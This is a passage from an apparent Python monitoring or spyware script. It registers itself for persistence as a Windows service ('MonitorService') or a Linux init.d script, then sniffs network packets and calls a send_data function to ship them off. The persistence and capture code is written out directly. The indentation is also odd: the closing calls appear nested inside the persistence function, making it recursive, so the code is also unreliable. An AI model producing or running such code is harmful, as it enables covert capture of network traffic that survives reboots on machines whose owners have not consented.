        if system == "Windows":
            subprocess.run(["sc", "create", "MonitorService", "binPath=", "C:\\path\\to\\your\\script.py"])
        elif system == "Linux":
            with open('/etc/init.d/monitor', 'w') as f:
                f.write('#!/bin/bash\npython3 /path/to/your/script.py')
            subprocess.run(["chmod", "+x", "/etc/init.d/monitor"])
            subprocess.run(["update-rc.d", "monitor", "defaults"])
    
    sniff(prn=packet_callback, store=0)
    send_data()
    create_persistence()

